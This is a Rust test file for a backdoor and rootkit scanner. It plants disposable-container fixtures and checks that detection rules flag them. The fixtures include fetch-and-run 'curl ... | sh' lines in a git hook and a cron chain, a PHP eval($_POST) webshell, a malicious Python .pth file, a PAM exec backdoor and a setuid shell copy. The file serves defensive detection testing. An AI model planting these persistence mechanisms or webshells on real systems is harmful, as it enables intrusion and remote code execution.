//! Disposable-container fixture run for the backdoor and rootkit entries.
//! Each case runs the catalog's own container command (the same text
//! `execute_in_container` sends) and decides hits with the entry's own rule.
//! Driven by `LOVELYHAWK_LAB_CONTAINERS=<family>=<container>[,...]` with
//! `LOVELYHAWK_LAB_CLI` (default `podman`); the probe owns the containers.

use super::{SystemFamily, guarded_container_command, lookup};
use crate::command_findings::finding_lines;
use std::process::Command;
use std::time::Instant;

struct Case {
    id: &'static str,
    fixture: &'static str,
    expect: &'static [&'static str],
    /// Markers only expected when a package manager (dpkg/rpm) is available
    /// on the target; skipped when the collector reports the ownership gap.
    expect_pkg: &'static [&'static str],
    quiet: &'static [&'static str],
}

const CASES: &[Case] = &[
    Case {
        id: "process-exe-path",
        fixture: "mkdir -p /tmp/lhbin; cp \"$(command -v sleep)\" /tmp/lhbin/sleep 2>/dev/null || cp /bin/busybox /tmp/lhbin/sleep; chmod +x /tmp/lhbin/sleep; (/tmp/lhbin/sleep 120 </dev/null >/dev/null 2>&1 &); sleep 1",
        expect: &["/tmp/lhbin/sleep"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "persistence-pam",
        fixture: "mkdir -p /etc/pam.d; printf 'auth optional pam_exec.so /tmp/x\\n# auth optional pam_exec.so /tmp/quiet\\n' > /etc/pam.d/lhtest",
        expect: &["pam_exec.so /tmp/x"],
        expect_pkg: &[],
        quiet: &["/tmp/quiet"],
    },
    Case {
        id: "persistence-inetd",
        fixture: "printf \"sshd: ALL : spawn (/bin/sh -c 'id') &\\n\" >> /etc/hosts.allow",
        expect: &["spawn"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "persistence-python-pth",
        fixture: "d=/usr/lib/python3/dist-packages; mkdir -p $d; printf \"import os; os.system('id')\\n\" > $d/lhtest.pth; printf \"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \\n\" > $d/distutils-precedence.pth",
        expect: &["lhtest.pth"],
        expect_pkg: &[],
        quiet: &["distutils-precedence.pth"],
    },
    Case {
        id: "persistence-git-hooks",
        fixture: "h=/root/repo/.git/hooks; mkdir -p $h; printf '#!/bin/sh\\ncurl http://198.51.100.7/x | sh\\n' > $h/post-merge; chmod +x $h/post-merge; printf '#!/bin/sh\\n' > $h/pre-commit.sample; chmod +x $h/pre-commit.sample",
        expect: &["post-merge"],
        expect_pkg: &[],
        quiet: &["pre-commit.sample"],
    },
    Case {
        id: "log-web-trace",
        fixture: "mkdir -p /var/log/nginx /var/www/html; printf '10.0.0.1 - - [01/Jan/2025:00:00:00 +0000] \"POST /.a.php HTTP/1.1\" 200 12 \"-\" \"x\"\\n10.0.0.1 - - [01/Jan/2025:00:00:01 +0000] \"GET /index.php HTTP/1.1\" 200 9 \"-\" \"x\"\\n' > /var/log/nginx/access.log; printf '<?php' > /var/www/html/.a.php",
        expect: &["/.a.php", "存在：/var/www/html/.a.php"],
        expect_pkg: &[],
        quiet: &["/index.php"],
    },
    Case {
        id: "file-web-version",
        fixture: "mkdir -p /var/www/html/thinkphp /var/www/html/pma; printf '<?php define(\"THINK_VERSION\",\"5.0.24\");' > /var/www/html/thinkphp/base.php; printf '<?php class Smarty { const SMARTY_VERSION = \"3.1.48\"; }' > /var/www/html/pma/Smarty.class.php",
        expect: &["ThinkPHP", "5.0.24", "需人工核对"],
        expect_pkg: &[],
        quiet: &["3.1.48"],
    },
    Case {
        id: "file-rootkit-signatures",
        fixture: "mkdir -p /dev/tux /bin; touch /dev/tux/.proc /bin/.login",
        expect: &["/dev/tux/.proc"],
        expect_pkg: &[],
        quiet: &["/dev/tux/.file"],
    },
    Case {
        id: "network-hidden-ports",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
    },
    Case {
        id: "network-bind-probe",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
    },
    Case {
        id: "system-lkm",
        fixture: "mkdir -p /usr/local/lib; touch /usr/local/lib/lhlab.ko",
        expect: &["lhlab.ko"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "perm-dt-needed",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
    },
    Case {
        id: "file-command-evidence",
        fixture: "touch -d '2001-01-01' /usr/bin/ping /bin/ping 2>/dev/null",
        expect: &["修改时间偏离"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "persistence-chain",
        fixture: "mkdir -p /etc/cron.d /tmp/lhchain; printf '#!/bin/sh
. /tmp/lhchain/second.sh
' > /tmp/lhchain/first.sh; printf '#!/bin/sh
curl http://198.51.100.7/x | sh
' > /tmp/lhchain/second.sh; printf '*/5 * * * * root /tmp/lhchain/first.sh
' > /etc/cron.d/lhchain",
        expect: &["second.sh"],
        expect_pkg: &[],
        quiet: &["first.sh | 第"],
    },
    Case {
        id: "perm-suid-ownership",
        fixture: "cp /bin/ls /usr/local/bin/lhlab 2>/dev/null || cp /bin/busybox /usr/local/bin/lhlab; chmod 4755 /usr/local/bin/lhlab; mkdir -p /opt/lhlab; cp \"$(command -v sh)\" /opt/lhlab/find 2>/dev/null || cp /bin/busybox /opt/lhlab/find; chmod 4755 /opt/lhlab/find",
        expect: &["GTFOBins"],
        expect_pkg: &["lhlab"],
        quiet: &[],
    },
    Case {
        id: "persistence-unit-owner",
        fixture: "mkdir -p /etc/systemd/system; printf '[Service]
ExecStart=/tmp/lhlab.sh
' > /etc/systemd/system/lhlab.service",
        expect: &[],
        expect_pkg: &["lhlab.service", "ExecStart=/tmp/lhlab.sh"],
        quiet: &[],
    },
    Case {
        id: "file-smarty-templates-c",
        fixture: "mkdir -p /var/www/html/templates_c /var/www/html/templates; printf '<?php eval($_POST[\"lh\"]);' > /var/www/html/templates_c/aa11_file_index.tpl.php; printf '{if $lh}ok{/if}' > /var/www/html/templates/index.tpl",
        expect: &["templates_c/aa11_file_index.tpl.php", "执行/解码特征"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "file-webshell-hint",
        fixture: "mkdir -p /var/www/html; printf '<?php eval($_POST[\"lh\"]);' > /var/www/html/lhlab.php",
        expect: &["/var/www/html/lhlab.php"],
        expect_pkg: &[],
        quiet: &[],
    },
    Case {
        id: "system-modules",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
    },
    Case {
        id: "process-hidden",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
    },
];

fn cli() -> String {
    std::env::var("LOVELYHAWK_LAB_CLI").unwrap_or_else(|_| "podman".to_owned())
}

fn exec(container: &str, script: &str) -> String {
    let output = Command::new(cli())
        .args(["exec", container, "/bin/sh", "-c", script])
        .output()
        .expect("container CLI");
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn family(name: &str) -> SystemFamily {
    match name {
        "debian" => SystemFamily::Debian,
        "alpine" => SystemFamily::Alpine,
        "redhat" => SystemFamily::RedHat,
        other => panic!("unknown family {other}"),
    }
}

#[test]
#[ignore = "needs disposable containers named in LOVELYHAWK_LAB_CONTAINERS"]
fn backdoor_entries_flag_container_fixtures() {
    let containers = std::env::var("LOVELYHAWK_LAB_CONTAINERS").expect("containers");
    let mut failures = Vec::new();
    for pair in containers.split(',') {
        let (name, container) = pair.split_once('=').expect("family=container");
        for case in CASES {
            if !case.fixture.is_empty() {
                exec(container, case.fixture);
            }
            let definition = lookup(case.id).expect("catalog entry");
            let command = guarded_container_command(&definition, family(name));
            let started = Instant::now();
            let output = exec(container, &command);
            let elapsed = started.elapsed();
            let lines: Vec<&str> = output.lines().collect();
            let flagged: Vec<&str> = finding_lines(&output, definition.abnormal)
                .into_iter()
                .filter_map(|line| lines.get(line as usize).copied())
                .collect();
            println!(
                "== {name} {} {:.1}s flagged={}\n{output}",
                case.id,
                elapsed.as_secs_f64(),
                flagged.len()
            );
            for marker in case.expect {
                if !flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: no flagged line with {marker}", case.id));
                }
            }
            let pkg_known = !output.contains("缺少 dpkg 与 rpm");
            for marker in case.expect_pkg {
                if pkg_known && !flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: no flagged line with {marker}", case.id));
                }
            }
            for marker in case.quiet {
                if flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: flagged quiet line {marker}", case.id));
                }
            }
            if elapsed.as_secs() >= definition.entry.timeout_seconds {
                failures.push(format!("{name} {}: exceeded timeout", case.id));
            }
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}
